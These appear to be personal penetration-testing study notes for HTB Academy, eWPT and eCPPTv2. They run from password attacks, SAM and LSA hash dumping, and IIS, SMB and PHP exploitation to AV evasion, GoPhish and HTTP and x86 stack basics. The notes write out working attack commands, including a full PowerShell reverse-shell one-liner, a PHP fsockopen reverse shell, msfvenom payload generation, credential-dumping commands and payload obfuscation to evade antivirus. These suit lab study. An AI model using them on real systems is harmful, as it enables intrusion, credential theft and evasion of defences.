        m1l0js@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

[+] Password Reuse / Default Passwords

    > It is common for both users and administrators to leave defaults in place. Administrators have to keep track of all the technology, infrastructure, and applications along with the data being accessed. In this case, the same password is often used for configuration purposes, and then the password is forgotten to be changed for one interface or another. In addition, many applications that work with authentication mechanisms, basically almost all, often come with default credentials after installation. These default credentials may be forgotten to be changed after configuration, especially when it comes to internal applications where the administrators assume that no one else will find them and do not even try to use them.
    > In addition, easy-to-remember passwords that can be typed quickly instead of typing 15-character long passwords are often used repeatedly because Single-Sign-On (SSO) is not always immediately available during initial installation, and configuration in internal networks requires significant changes. When configuring networks, we sometimes work with vast infrastructures (depending on the company's size) that can have many hundreds of interfaces. Often one network device, such as a router, printer, or a firewall, is overlooked, and the default credentials are used, or the same password is reused.
    
* Credential Stuffing
    > There are various databases that keep a running list of known default credentials. One of them is the DefaultCreds-Cheat-Sheet => (https://github.com/ihebski/DefaultCreds-cheat-sheet)
    > Besides the default credentials for applications, some lists offer them for routers. One of these lists can be found here => (https://www.softwaretestinghelp.com/default-router-username-and-password-list/)


[+] Windows Local Password Attacks
* Attacking SAM
    > With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.
    + Copying SAM Registry Hives
        > There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:   
            Registry Hive	Description
            hklm\sam	    Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
            hklm\system	    Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
            hklm\security	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
        > We can create backups of these hives using the reg.exe utility. Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:
            C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
            The operation completed successfully.
            C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
            The operation completed successfully.
            C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
            The operation completed successfully.
        > Technically we will only need hklm\sam & hklm\system, but hklm\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use Impacket's smbserver.py in combination with some useful CMD commands to move the hive copies to a share created on our attack host.
        > All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the directory on our attack host where the share will be storing the hive copies (/home/ltnbob/Documents). Know that the smb2support option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the numerous severe vulnerabilites and publicly available exploits.
            m1l0js@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
        > Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
            C:\> move sam.save \\10.10.15.16\CompData
                1 file(s) moved.
            C:\> move security.save \\10.10.15.16\CompData
                1 file(s) moved.
            C:\> move system.save \\10.10.15.16\CompData
                1 file(s) moved.
    + Dumping hashes
        > m1l0js@htb[/htb]$ locate secretsdump 
        > m1l0js@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
            Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
        > Here we see that secretsdump successfully dumps the local SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the system bootkey before proceeding to dump the LOCAL SAM hashes. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:
            Dumping local SAM hashes (uid:rid:lmhash:nthash)
        > This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.
        > Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.

* Remote Dumping & LSA Secrets Considerations
    > With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
    > Dumping LSA Secrets Remotely
        m1l0js@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
    > Dumping SAM Remotely
        m1l0js@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

          
-=-=-=
Windows Black Box Penetration Test
  Port scanning & enumeration
  Targeting Microsoft IIS FTP
    In most cases, the FTP server is used to transfer files to and from the directory of the web server. As a result, if we are able to gain access to the FTP server, we may be able access the directory of the Microsoft IIS web server.
    nmap -sV -p21 --script=ftp-anon 10.0.28.97
    //If we need valid credentials, we could use hydra with different lists users/passwords or users/users
    ftp 10.0.28.97 21
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
  Targeting SMB
    enum4linux -u vagrant -p vagrant 10.10.16.3 //Enumerate other user accounts
    python3 psexec.py administrator@10.10.16.3
  Targeting mysql
    //Once we are in, we could change several things
      UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; //For example
    Change the content in phpmyadmin.conf to Allow from all
    //Once you have done changes regarding with Apache you have to restart this service. This can be done with
      net stop wampapache
      net start wampapache

Linux exploitation
  Brute force with SMTP to a vulnerable vsftpd 
    msfconsole -q
      search smtp_enum
    //Once you have some users
    hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp 
    //UPload a reverse shell 
    ls -al /usr/share/webshells/php-reverse-shell.php
    cp /usr/share/webshells/php-reverse-shell.php . //Change $ip and $port
    ftp 10.2.17.5 21
    cd /var/www/
    cd dav
    put shell.php //and nc -nvlp 1234 in our machine
  
  Targeting PHP
    10.2.19.172/phpinfo.php //Know some useful info with its version
    searchsploit php cgi //Lower than 5.3.12
    //We could use exploit/multi/http/php_cgi_arg_injection
    //If we try to modify 18836.py we could use this one liner to obtain a reverse shell
      $sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");

  Targeting Samba
   msfconsole -q
    search smb_version //It is valid for samba and smb
    use auxiliary/scanner/smb/smb_version  
AV evasion with Shelter
  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
    - Uninstalling/disabling security software 
    - Obfuscating/encrypting data and scripts
    - Leverage and abuse trusted processes to hide and masquerade their malware
  //We are going to try to change the signature of the malicious executable that we are generating
  AV detection methods
    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
  AV evasion techniques
    On-disk evasion techniques
      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
    In-Memory evasion techniques
      1.  Focuses on manipulation of memory and does not write files to disk
      2.  Injects payload into a process by leveraging various Windows APIs
      3.  Payload is then executed in memory in a separate thread
  Usage of shellter
    https://www.shellterproject.com/introducing-shellter/
    apt-get install shellter -y
    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
    dpkg --add-architecture i386
    apt-get install wine32
    //We could use the vncviewer.exe 
    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
    cd /usr/share/windows-resources/shellter
    sudo wine shellter.exe
      Auto mode
      /home/kali/Desktop/AVBypass/vncviewer.exe
      //Shellter will trace a random number of instructions 
      Enable Stealth Mode? Yes //If you want that executable work as intended.
      Payload? Listed payload 
      set lhost
      set lport
      msfconsole -q
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
      python3 -m http.server 80
        //Execute it in the Windows machine 
  Obfuscating Powershell code
    git clone https://github.com/danielbohannon/Invoke-Obfuscation
    Use a reverse shell in powershell and save it as shell.ps1
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    apt-get install powershell -y
    pwsh
      cd ./Invoke-Obfuscation
      Import-Module ./Invoke-Obfuscation.ps1
      cd ..
      Invoke-Obfuscation
        SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
0-0-0-0-0-0-

Social Engineering 
  GoPhish
    1. New sending profile
      from: info <support@demo.ine.local>
      Host: localhost:25 //Where de stmp server is
      Username: red@demo.ine.local
    2. New landing page
      + Capture submitted data
      Redirect to: http://localhost:8080
    3. Email Templates
      Import email
    4. Users & Groups
      Import csv 
    5. Campaigns
      URL: http://localhost //It could be a cloud server

  
Web Application penetration testing: Introduction to the Web ahd HTTP protocol
  Intro to web
    //How to upload and delete files?
      curl 192.36.17.3/uploads/ --upload-file hello.txt
      curl -X DELETE 192.36.17.3/uploads/hello.txt
  Gobuster
    gobuster dir -u http://192.19.3.2 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
  Nikto
    nikto -h http://192.158.187.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V -o nikto.html -Format htm
  Passive crawler with BurpSuite
    Dashboard > Capturing 
  If with BurpSuite we have a header Authorization: Basic ==> We can base64-decode ==> Add Prefix to admin: ==> Add another payload processing to encode the payload to base64

-=-=-==============-----------------------------------------============
eWPT(Notes)
The Rules of Engagement
  Why do you want to execute a penetration tester?
  When creating a timetable, it should contain at least the following information:
    - Target(s)
    - Start (format: Date-time)
    - End   (format: Date-time)
    - Criticality of test(format: text) //Medium, High, Low
    - Step in process(format: text) //Scanning, OS detection, exploitation, etc
    - Source IP address
A non-disclosure agreement
An emergency plan involves:
  - The timetable
  - The contact in charge of responding to the emergency plan
  - The solutions to apply to the issue
Methodologies
  http://www.pentest-standard.org/index.php/Main_Page
  https://owasp.org/www-project-web-security-testing-guide/
The reporting phase
  Freemind(http://freemind.sourceforge.net/wiki/index.php/Download) //Mind mapping
  Your penetration test report's target audience groups are:
    - Executive: You have to speak in terms of metrics, risk mitigation and money loss
    - IT Department: Which areas or departments are more affected and to what kind of vulnerabilities
    - Development: Your exploits, your POCs, remediation tips, source code, etc
  A typical structure
    Executive summary(2-3 pages)
      //"The purpose of this assessment and report is to identify any web application issues that could affect ABC, Inc and the web server hosting it and to provide solutions to remedy these same issues. "
    Vulnerability report => Remediation report

Basics
  HTTP protocol basics
    Format of an HTTP message is
      HEADERS\r\n
      \r\n

      MESSAGE BODY\r\n

      \r(Carriage Return): moves the cursor to the beginning of the line
      \n(Line Feed): moves the cursor down to the next line
      \r\n: Is the same of hitting enter on your keyboard


    Note that a connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver
    HTTP Request:
      HTTP/1.1 ==> This is the HTTP protocol version that your browser wants to talk with. This basically informs the web server about which version of HTTP you would like to use in any further communication
      Host ==> It allows a web server to host multiple websites at a single IP address.
      Host value ==> Host value + Path combine to create the full URL you are requesting: the home page of www.google.com/
      User-Agent ==> Reveals your browser version, operating system and language to the remote web server
      Accept ==> Used by your browser to specify which document type is expected to be returned as a result of this request
      Accept-Encoding ==> Similar to accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information
      Connection ==> With HTTP 1.1 you can keep your connection to the remote web server open for an unspecified amount of time using the value "keep-alive". This indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0)

    HTTP response
      Date: Represents the date and time at which the message was originated
      Cache-Control: Allows the browser and the server to agree about caching rules. Cached contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used.
      Content-Type: Lets the client know how to interpret the body of the message
      Content-Encoding: "gzip" Extends Content-Type. In this case the message body is compressed with gzip
      Server: "gws". Displays the web server banner. Apache and IIS are common web servers. Google uses this custom webserver banner (Google Web Server)
      Content-Length: Indicates the length, in bytes, of the message body
      
  Encoding
    Internet users, via their web browsers, request billions of pages every day. All of the content of these pages are displayed according to a charset. But what is a character set? It contains a set of characters: they represent the set of all symbols(What the user reads as he sees it on the screen) and code points(Numeric index, used to distinguish, unambiguosly, the symbol within the charset) that the end user can display in their browser window. //A symbol can be shown only if it exists in the charset. Examples of charsets are: ASCII(https://www.ascii-code.com/), Unicode(https://unicode-table.com/en/#0032)/UTF-8, UTF-16 and UTF-32(The numbers are the amount of bits used to represent code points), Latin-1 and so on

    HTML4 ==> <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"> //ISO-8859-1: "8-bit single-byte coded graphic character sets" aka Latin 1
    HTML5 ==> <meta charset="UTF-8">
    
    If you want to show symbols (like < > ) in your web document and you want to avoid the symbols being interpreted by your browser as HTML language elements, then you need to use the related entities(It is not a really security feature however, its use can limit most client side attacks. An HTML entity is simply a string (starting with & or &# and ending with ;) that corresponds with a symbol. When the browser encounters an entity in an HTML page it will show the symbol to the user and will not ever interpret the symbol as an HTML language element
    Character Reference       Rule                                            Encoded character
    Named entity              & + named character references + ;              &lt; 
    Numeric Decimal           & + # + D + ;                                   &#60;
                                D = a decimal number
    Numeric Hexadecimal       & + #x + H + ;                                  &#x3c;
                                H = an hexadecimal number (case-insensitive)  &#X3C;

    URL encoding(percent encoding)
      URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding theme is required. 
      This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:
        1. Unreserver chars: [a-zA-Z] [0-9] [-._~]
        2. Reserved chars (they have a specific purpose): :/?#[]@!$&"()*+,;=%·
      Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Reserved chars must be encoded when they have no special role inside the URL. A list of common encoded characters(https://www.w3schools.com/tags/ref_urlencode.asp)
        Character   Purpose in URI          Encoding
        #           Separate anchors        %23
        ?           Separate query string   %3F
        &           Separate query elements %26
        +           Indicates a space       %2B

    Base64 
      Is a binary-to-text encoding schema used to convert binary files and send them over Internet. For example, the e-mail protocol makes massive use of this encoding to attach files to messages. The HTML language permits the inclusion of some resources by using this encoding. For example, an image can be included in a page by inserting its binary content that has been converted to base64
      The alphabet of the Base64 encoding scheme is composed of:
        digits ==> [0-9]
        latin letters ==> [a-zA-Z] 
        + and /

  Same Origin Policy(SOP)
    This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
    The main rule of SOP is:
      "A document(HTML page, an iframe included in the main page or a response to an Ajax request) can access (through JavaScript) the properties of another document only if they have the same origin" //More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.
    CSS stylesheets(*.css), images and scripts(*.js) are loaded by the browser without consulting the policy. SOP is consulted when cross-site HTTP requests are inititated from within client side scripts (IE: JavaScript), or when an Ajax request is run.
    The origin is defined by the following triplet:
      Protocol + Host + Port ==> http://www.elswapt.site
    Other example ==> http://els.wapt.site/index.php
      SOP OK ==> http://els.wapt.site/admin/index.php ==> Same protocol, host and port
      SOP not OK ==>  https://els.wapt.site/index.php ==> Different protocol
    Content from ... inherits the origin
      about:blank
      javascript:
      data: 
    !Internet explorer works a bit differently from other browsers. It has two exceptions:
      · Port: It does not consider the port as a Same Origin component
      · Trust zone: The same Origin is not applied to domains that are in highly trusted zone (i.e. corporate domains)
    What would it happen if SOP did not exist?

      Suppose you are logged in to your bank site and suppose your friend invites you to visit his new website. Your evil friend could build a crafted page, instigate you to visit it and once visited by you, access(some) personal information from your bank account
    Example 
      Let us suppose that index.html on domain a.elswapt.site (referred to as origin1: http://a.elswapt.site) wants to access via an Ajax request(hxr) the home.html page on domain b.elswapt.site (referred to as origin2: http://b.elswapt.site). 
      The document index.html on domain a.elswapt.site cannot access via an Ajax request (xhr) the home.html page on domain b.elswapt.site
    
    Exceptions
    	window.location: A document can always write the location property of another document. The window.Location object can be used to get the current page address (URL) and to redirect the browser to a new page
	document.domain
	Cross window messaging 
	Cross origin resource sharing (CORS)
	
	


   	







    
How to pase into web page fields that prevent copy and paste?
document.getElementById("paste-no").onpaste={};
document.getElementById("paste-no").onpaste=null;


Waiting for some web programming knowledge

-=-=-=-=-=-

eCPPTv2
Architecture fundamentals
CPU, ISA and Assembly
 	> CPU (Central Process Unit): Is the device in charge of executing the machine code of a program
 	> Machine code (= machine language): Set of instructions that the CPU processes. Each instruction is a primitive command that executes a specific operation such as move data, changes the execution flow of the program, perform arithmetic or logic operations and others. CPU instructions are represented in hexadecimal. Therefore, the same machine code gets translated into mnemonic code (a more readable language); this is called the assembly language (ASM). The assembler we are going to use is NASM
 	> Each CPU has its own instruction set architecture (ISA) that a programmer (or a compiler) must understand and use to write a program correctly for that specific CPU and machine. One of the most common ISA is the x86 instruction set from the Intel 8086. The x86 acronym identifies 32-bit processors, while x64(aka x86_64 or AMD64) identifies the 64-bit versions. 

Registers
	> The number of bits, 32 or 64, refers to the width of the CPU registers. Each CPU has its fixed set of registers that are accessed when required. You can think of registers as temporary variables used by the CPU to get and store data.
	> Although almost all registers are small portions of memory in the CPU and serve to store data temporarily, it is important to know that some of them have specific functions, while some others are used for general data storage. We will focus on a specific group of registers: The General Purpose Registers (GPRs)
	> 8 general purpose registers to the x86 architecture
	EAX => Accumulator 	==> Used in arithmetic operation
	ECX => Counter 		==> Used in shift/rotate instruction and loops
	EDX => Data 		==> Used in arithmetic operation and I/0
	EBX => Base		==> Used as a pointer to data
	ESP => Stack Pointer	==> Pointer to the top of the stack
	EBP => Base Pointer 	==> Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer)
	ESI => Source Index	==> Used as a pointer to a source in stream operation
	EDI => Destination 	==> Used as a pointer to a destination in stream operation
	> The naming convention of the old 8-bit CPU had 16-bit register divided into two parts:
		- A low byte, identified by an L at the end of the name 
		- A high byte, identified by an H a the end of the name
		For example: AH|AL, CH|CL, DH|DL, BH|BL, SPL, BPL, SIL and DIL
	> The 16-bit naming convention combines the L and the H and replaces it with an X. While for Stack Pointer, Base Pointer, Source and Destination registers it simply removes the L
		For example: AX, CX, DX, BX, SP, BP, SI and DI
	> In the 32-bit representation, the register acronym is prefixed with an E, meaning extended
	> In the 64-bit representation, the E is replaced with the R
	> Another important register , the EIP (x86 naming convention). It controls the program execution by storing a pointer to the address of the next instruction (machine code) that will be executed. It tells the CPU where the next instruction is.

Process Memory
The process is divided into four regions: Text, Data, the Heap and the Stack
	> The Text region, or instruction segment, is fixed by the program and contains the program code (instructions). This region is marked as read-only since the program should not change during execution
	> The Data region is divided into initialized data and uninitialized data. Initialized data includes items such as static and global declared variables that are pre-defined and can be modified. 
		+ The unintialized data, named Block Started by Symbol(BSS) also initializes variables thata are initialized to zero or do not have explicit initialization(ex. static int t)
	> Next is the Heap, which starts right after the BSS segment. During the execution, the program can request more space in memory via 'brk' and 'sbrk' system calls, used by 'malloc', 'realloc' and 'free'. Hence, the size of the data region can be extended.
	> The last region of the memory is the Stack.

The Stack
· The Stack is a Last-in-First-out (LIFO) block of memory. It is located in the higher part of the memory. You can think of the stack as an array used for saving a function's return addresses, passing function arguments and storing variables. The purpose of the ESP register(Stack Pointer) is to identify the top of the stack and it is modified each time a value is pushed in (PUSH) or popped out (POP)
· The stack grows downwards, towards the lower memory addresses
· The Heap would start from lower addresses and grow upwards and the Stack would start from the end of the memory and grow downward.
· The first example of how the stack changes is the execution of the following instruction: PUSH E
· The second example is the execution of the following instruction: POP E
	PUSH Instruction
	· A PUSH instruction subtracts 4(in 32-bit) or 8(in 64-bit) from the ESP and writes the data to the memory address in the ESP and then updates the ESP to the top of the stack. Remember that the Stack grows backward. Therefore the PUSH subtracts 4 or 8 in order to point to a lower memory location on the stack. If we do not subtract it, the PUSH operation will overwrite the current location pointed by ESP (the top) and we would lose data.
	> The ESP points to the top of the stack -4
		ESP	A	==> PUSH (E) ==>	E 	ESP-4
			B				A
			C				B
			D				C
							D
	> A more detailed example of the PUSH instruction
 		+ Starting value (ESP contains the address value): ESP points to the following memory address: 0x0028FF80
		+ Process: The program executes the instruction PUSH 1. ESP decreases by 4, becoming 0x0028FF7C and the value 1 will be pushed on the stack
				      ...	==> PUSH 1 ==>	ESP = 0x0028FF7C ==> 00000001
		ESP = 0x0028FF80 => ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..					     ..data..
	POP Instruction
	 POP PROCESS
	 · A POP is executed and the ESP register is modified
	 STARTING VALUE
	 · The ESP points to the top of the stack (Previous ESP +4)
	 PROCESS
	 · The POP operation is the opposite of PUSH and it retrieves data from the top of the Stack. Therefore, the data contained at the address location in ESP (the top of the stack) is retrieved and stored (usually in another register). After a POP operation, the ESP value is incremented in x86 by 4 or in x64 by 8.
	ENDING VALUE
 	> The ESP points to the top of the stack +4. (Same as the previous location before the PUSH)
 		ESP	E	==> POP (E) ==>		A 	ESP+4
 			A				B
 			B				C
 			C				D
 			D       			

	> A more detailed example of the POP instruction
 		+ Starting value (ESP contains the address value): After the PUSH 1 the ESP points to the following memory address: 0x0028FF7C
		+ Process: The program executes the instruction POP EAX. The value (00000001) contained at the address of the ESP (0x0028FF7C = the top of the Stack) will be popped out from the stack and will be copied in the EAX register. Then, ESP is updated by adding 4 and becoming 0x0028FF80.

										     00000001
		ESP = 0x0028FF7C => 00000001	==> POP EAX ==>	ESP = 0x0028FF80 ==> ..data.. 
		 	            ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..
	Procedures and functions
	 > It is important to understand thtat the value popped from the stack is not deleted (or zeroed). It will stay in the stack until another instruction overwrites it.

· Now that we know more about the Stack, we will investigate how procedures and functions work. It is important to know that procedures and functions alter the normal flow of the process. When a procedure or a function terminates, it returns control to the statement or instruction that called the function.	

· Stack Frames
 > Functions contain two important components
  - Prologue: Prepares the stack to be used 
  - Epilogue: When the function has completed, the epilogue resets the stack to the prologue settings.
 > The Stack consists of logical stack frames (portions/areas of the Stack) that are PUSHed when calling a functions and POPped when returning a value.
 > When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location (top of the stack); this allows the subroutine to operate independently in its own location in the stack.
 > When the subroutine ends, 2 things happen:
  1. The program receives the parameters passed from the subroutine.
  2. The Instruction Pointer (EIP) is reset to the location at the time of the initial call.
  * In other words, the stack frame keeps track of the location where each subroutine should return the control when it terminates.
 > This process has tree main operations:
  1. When a function is called, the arguments [(in brackets)] need to be evaluated
  2. The control flow jumps to the body of the function and the program executes its code
  3. Once the function ends, a return statement is encountered, the program returns to the function call (the next statement in the code).
  # Example in C
  int b(){ //function b
          return 0;
  }
  int a(){ //function a
          b();
          return 0;
  }
  int main(){ //main function
          a();
          return 0;
  }
  ## Explanation
  #Higher memory address(To upwards)Lower memory address.
  · Step 1:
  	+ The entry point of the program is main()
	+ The first stack frame that needs to be pushed to the Stack is the main() stack frame. Once initialized, the stack pointer is set to the top of the stack and a new main() stack frame is created.
  · Step 2:
  	+ Once inside main(), the first instruction that executes is a call to the function named a(). Once again, the stack pointer is set to the top of the stack of main() and a new stack frame for a () is created on the stack.
  · Step 3:
  	+ Once the function a() starts, the first instruction is a call to the function named b(). Here again, the stack pointer is set and a new stack frame for b() will be pushed on the top of the stack.
  · Step 4:
  	+ The function b() does nothing and just returns. When the function completes, the stack pointer is moved to its previous location and the program returns to the stack frame of a() and continues with the next instruction.
  · Step 5:
  	+ The next instruction executed is the return statement contained in a(). The a() stack frame is popped, the stack pointer is reset and we will get back in the main() stack frame.
  ## Another example related with Buffer Overflow.
  void functest(int a, int b, int c)  {
          int test1 = 55;
          int test2 = 56;
  }
  int main(int argc, char * argv[]) {
          int x = 11;
          int z = 12;
          int y = 13;
          functest(30,31,32);
          return 0;
  }
  ##Explanation
  · Step 1:
  	+ When the program starts, the function main() parameters (argc, argv) will be pushed on the stack from right to left. 
		argc
		argv
		...
  · Step 2:	
	+ CALL the function main(). Then, the processor PUSHes the content of the EIP(Instruction Pointer) to the stack and points to the first byte after the CALL instruction.
	+ This process is important because we need to know the address of the next instruction in order to proceed when we return from the function called.
  · Step 3:
  	+ The caller (the instruction that executes the function calls - the OS in this case) loses its control and the calle (the function that is called - the main function) takes control.
		old EIP  //Return address from main(). The next instruction to execute once we return from main.
		argc
		argv
		...
  · Step 4:
  	+ Now that we are in the main() function, a new stack frame needs to be created. The stack frame is defined by the EBP (Base Pointer) and the ESP (Stack pointer). Because we don't want to lose the old stack frame information, we have to save the current EBP on the Stack. If we did not do tis, when we returned, we will not know that this information belonged to the previous stack frame, the function that called main(). Once its value is stored , the EBP is updated and it points to the top of the stack
		old EBP //Contains the base pointer of the caller. At this time, both EBP and ESP points at the 
		old EIP   |
		argc	  |	Old stack frame
		argv      |
		...       | 
 · Prologue
 	It is a sequence of instructions that take place at the beginning of a function. This will occur for all functions. Once the callee gets the control, it will execute the following instructions:
	1 push ebp
	2 mov ebp, esp
	3 sub esp, X // X is a number
	
	##Explanation
	The first instruction(push ebp) saves the old base pointer onto the stack,so it can be restored later on when the function returns.
	EBP is currently pointing to the location of the top of the previous stack frame.
	----
	The second instruction (mov ebp, esp) copies the value of the Stack pointer (ESP - top of the stack) into the base pointer (EBP); this creates a new stack frame on top of the Stack.
	 + The base of the new stack frame is on top of the old stack frame
	 + Important: Notice that in assembly, the second operand of the instruction (esp in this case) is the source, while the first operand (ebp in this case) is the destination. Hence, esp is moved into ebp.
		
	The last instruction (sub esp, X) moves the Stack Pointer (top of the stack) by decreasing its value, this is necessary to make space for the local variables.
	 + Similar to the previous instruction, X is the source and esp is the destination. Therefore, the instruction subtracts X from esp (this X is not the int variable X from the program)
	 + The third instruction creates enough space in the stack to copy local variables. Variables are allocated by decreasing the stack pointer (top of the stack) by the amount of space required.
	 + Remember that the stack grows backward. Therefore, we have to decrease its value to expand the stack frame
	
	 + This represents the Stack once the prologue has happened.
	   Lower memory address					     <= [ESP-X]
	   	To			...
	   	[Upward]		EBP-8
	   	From			EBP-4	
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 	=> Notice that since the main function contains other variables and a function call, the actual stack frame for the main() subroutine is slightly bigger.
	 + Once the prologue ends, the stack frame for main() is complete and the local variables are copied to the stack. Since ESP is not pointing to the memory address right after EBP, we cannot use the PUSH operation, since PUSH stores the value on top of the stack (the addresss pointed by ESP).
	 + The variable is a hexadecimal value that is an offset from the base pointer (EBP) or the stack pointer (ESP)
	 + The instructions after the prologue are like the following:
	 	MOV DWORD PTR SS:[ESP+Y],0B
		> This instruction means: move the value 0B (hexadecimal of 11 - the first local variable) into the memory address location pointed at ESP+Y. Note that Y is a number and ESP+Y points to a memory address between EBP and ESP.
	 + This process will repeat through all the variables and once the process completes, the stack will look like the following

	   Lower memory address					     <= ESP
	   	To			...	13 (y)
	   	[Upward]		EBP-8	12 (z)
	   	From			EBP-4	11 (x)		     <= [ESP+Y]
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 + Then the main() continues executing its instructions.

  · Step 5
  	+ The next instruction calls the function functest().
	+ The whole process will be executed again. This time a new stack frame will be created for the function functest().
	The process looks like the following:
		> PUSH the function parameters in the stack
		> Call the function functest()
		> Execute the prologue (which will update EBP and ESP to create the new stack frame)
		> Allocate local variables onto the stack.
	+ The following is how the stack looks like at the end of the entire process.
		Functest Stack Frame	56		<- ESP
					55
					Old EBP (main)  <- EBP
		Main Stack Frame	old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...

1.2.4.6 Epilogue
 + We have seen how the stack frames are created. Now, we have to understand how they are destroyed. What happens when the code executes a return statement and the control goes back to the previous procedure (and stack frame)?
 + When the program enters a function, the prologue is executed to create the new stack frame
 + When the program executes a return statement, the previous stack frame is restored thanks to the epilogue.
 + The operations executed by the epilogue are the following:
 	 · Return the control to the caller
	 · Replace the stack pointer with the current base pointer. It restores its value to before the prologue; this is done by POPping the base pointer from the stack.
	 · Returns to the caller by POPping the instruction pointer from the stack (stored in the stack) and then it jumps to it.
 + The following code represents the epilogue:
 	leave 
	ret
 + The instructions can also be written as follows:
 	mov esp, ebp
	pop ebp
	ret
 + This is what happens to the previous stack when the function functest() ends. Notice that even if the code does not contain a return, when the program leaves a subroutine it will still run the epilogue.
					...
